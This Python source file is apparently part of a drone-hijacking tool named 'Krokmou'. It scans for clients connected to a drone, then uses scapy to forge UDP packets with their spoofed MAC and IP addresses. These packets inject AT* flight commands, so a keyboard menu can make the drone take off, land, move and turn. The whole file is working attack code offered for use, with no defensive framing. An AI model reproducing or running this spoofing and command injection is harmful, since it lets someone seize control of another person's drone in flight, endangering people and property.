import readchar
from scapy.all import *
from time import sleep
from scan_clients import *
BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m'

# srcIP = "192.168.1.2"
# srcMAC = "8C:F5:A3:1B:54:97"

srcPort = 5556
dstPort = 5556
dstIP = "192.168.1.1"
sequenceNumber = 10000000000

def menu():
    os.system("clear")
    controler = """
            FRONT                                        UP
             |Z|                                        |I|
    LEFT |Q| |S| |D| RIGHT                TURN LEFT |J| |K| |L| TURN RIGHT
             BACK                                       DOWN




           TAKE OFF                               ________________
             |P|                                 |______SPACE______|
             |M|                                        STOP
             LAND
    """
    sys.stdout.write(GREEN + controler)

def hover(list_of_client, dstMAC, iface):
    global sequenceNumber
    for i in range(5):
        sequenceNumber+=1
        payload = "AT*PCMD="+str(sequenceNumber)+",0,0,0,0,0\r"
        print(payload)
        for client in list_of_client:
            spoofed_packet = Ether(src=client.mac, dst=dstMAC) / IP(src=client.ip, dst=dstIP) / UDP(sport=srcPort, dport=dstPort) / payload
            sendp(spoofed_packet, iface=iface)
        sleep(0.3)

def take_off(list_of_client, dstMAC, iface):
    global sequenceNumber
    for i in range(1):
        sequenceNumber+=1
        payload = "AT*REF="+str(sequenceNumber)+",290718208\r"
        print(payload)
        for client in list_of_client:
            spoofed_packet = Ether(src=client.mac, dst=dstMAC) / IP(src=client.ip, dst=dstIP) / UDP(sport=srcPort, dport=dstPort) / payload
            sendp(spoofed_packet, iface=iface)

def land(list_of_client, dstMAC, iface):
    global sequenceNumber
    for i in range(5):
        sequenceNumber+=1
        payload = "AT*REF="+str(sequenceNumber)+",290717696\r"
        print(payload)
        for client in list_of_client:
            spoofed_packet = Ether(src=client.mac, dst=dstMAC) / IP(src=client.ip, dst=dstIP) / UDP(sport=srcPort, dport=dstPort) / payload
            sendp(spoofed_packet, iface=iface)
        sleep(0.3)

def front(list_of_client, dstMAC, iface):
    global sequenceNumber
    for i in range(3):
        sequenceNumber+=1
        payload = "AT*PCMD="+str(sequenceNumber)+",1,0,-1050253722,0,0\r"
        print(payload)
        for client in list_of_client:
            spoofed_packet = Ether(src=client.mac, dst=dstMAC) / IP(src=client.ip, dst=dstIP) / UDP(sport=srcPort, dport=dstPort) / payload
            sendp(spoofed_packet, iface=iface)
        sleep(0.3)

def back(list_of_client, dstMAC, iface):
    global sequenceNumber
    for i in range(3):
        sequenceNumber+=1
        payload = "AT*PCMD="+str(sequenceNumber)+",1,0,1050253722,0,0\r"
        print(payload)
        for client in list_of_client:
            spoofed_packet = Ether(src=client.mac, dst=dstMAC) / IP(src=client.ip, dst=dstIP) / UDP(sport=srcPort, dport=dstPort) / payload
            sendp(spoofed_packet, iface=iface)
        sleep(0.3)

def left(list_of_client, dstMAC, iface):
    global sequenceNumber
    for i in range(3):
        sequenceNumber+=1
        payload = "AT*PCMD="+str(sequenceNumber)+",1,-1050253722,0,0,0\r"
        print(payload)
        for client in list_of_client:
            spoofed_packet = Ether(src=client.mac, dst=dstMAC) / IP(src=client.ip, dst=dstIP) / UDP(sport=srcPort, dport=dstPort) / payload
            sendp(spoofed_packet, iface=iface)
        sleep(0.3)

def right(list_of_client, dstMAC, iface):
    global sequenceNumber
    for i in range(3):
        sequenceNumber+=1
        payload = "AT*PCMD="+str(sequenceNumber)+",1,1050253722,0,0,0\r"
        print(payload)
        for client in list_of_client:
            spoofed_packet = Ether(src=client.mac, dst=dstMAC) / IP(src=client.ip, dst=dstIP) / UDP(sport=srcPort, dport=dstPort) / payload
            sendp(spoofed_packet, iface=iface)
        sleep(0.3)

def up(list_of_client, dstMAC, iface):
    global sequenceNumber
    for i in range(3):
        sequenceNumber+=1
        payload = "AT*PCMD="+str(sequenceNumber)+",1,0,0,1050253722,0\r"
        print(payload)
        for client in list_of_client:
            spoofed_packet = Ether(src=client.mac, dst=dstMAC) / IP(src=client.ip, dst=dstIP) / UDP(sport=srcPort, dport=dstPort) / payload
            sendp(spoofed_packet, iface=iface)
        sleep(0.3)

def down(list_of_client, dstMAC, iface):
    global sequenceNumber
    for i in range(3):
        sequenceNumber+=1
        payload = "AT*PCMD="+str(sequenceNumber)+",1,0,0,-1050253722,0\r"
        print(payload)
        for client in list_of_client:
            spoofed_packet = Ether(src=client.mac, dst=dstMAC) / IP(src=client.ip, dst=dstIP) / UDP(sport=srcPort, dport=dstPort) / payload
            sendp(spoofed_packet, iface=iface)
        sleep(0.3)

def turn_left(list_of_client, dstMAC, iface):
    global sequenceNumber
    for i in range(3):
        sequenceNumber+=1
        payload = "AT*PCMD="+str(sequenceNumber)+",1,0,0,0,-1050253722\r"
        print(payload)
        for client in list_of_client:
            spoofed_packet = Ether(src=client.mac, dst=dstMAC) / IP(src=client.ip, dst=dstIP) / UDP(sport=srcPort, dport=dstPort) / payload
            sendp(spoofed_packet, iface=iface)
        sleep(0.3)

def turn_right(list_of_client, dstMAC, iface):
    global sequenceNumber
    for i in range(3):
        sequenceNumber+=1
        payload = "AT*PCMD="+str(sequenceNumber)+",1,0,0,0,1050253722\r"
        print(payload)
        for client in list_of_client:
            spoofed_packet = Ether(src=client.mac, dst=dstMAC) / IP(src=client.ip, dst=dstIP) / UDP(sport=srcPort, dport=dstPort) / payload
            sendp(spoofed_packet, iface=iface)
        sleep(0.3)

def ci_main(drone, iface):
    dstMAC = drone.bssid
    list_of_client = scanNetwork("192.168.1.2-10")  #return list of Class Object clients connected to the drone. Client define in scan_clients
    if len(list_of_client) >= 1:
        while True:
            menu()
            choice = readchar.readchar()

            if choice.upper() == 'Z':
                front(list_of_client, dstMAC, iface)
            elif choice.upper() == 'S':
                back(list_of_client, dstMAC, iface)
            elif choice.upper() == 'Q':
                left(list_of_client, dstMAC, iface)
            elif choice.upper() == 'D':
                right(list_of_client, dstMAC, iface)
            elif choice.upper() == 'I':
                up(list_of_client, dstMAC, iface)
            elif choice.upper() == 'K':
                down(list_of_client, dstMAC, iface)
            elif choice.upper() == 'J':
                turn_left(list_of_client, dstMAC, iface)
            elif choice.upper() == 'L':
                turn_right(list_of_client, dstMAC, iface)
            elif choice.upper() == 'P':
                take_off(list_of_client, dstMAC, iface)
            elif choice.upper() == 'M':
                land(list_of_client, dstMAC, iface)
            elif choice == ' ':
                break
            else:
                print('\n{}Grrrr{}: Krokmou doesn\'t junderstand.\n'.format(RED,GREEN))
    else:
        print('\n{}Ronron{}: You\'re Krokmou\'s master. Control it with your own controler.\n'.format(RED,GREEN))
        print("\n{}Press ENTER to return to main menu...".format(GREEN))
        enter = input()
        os.system("clear")
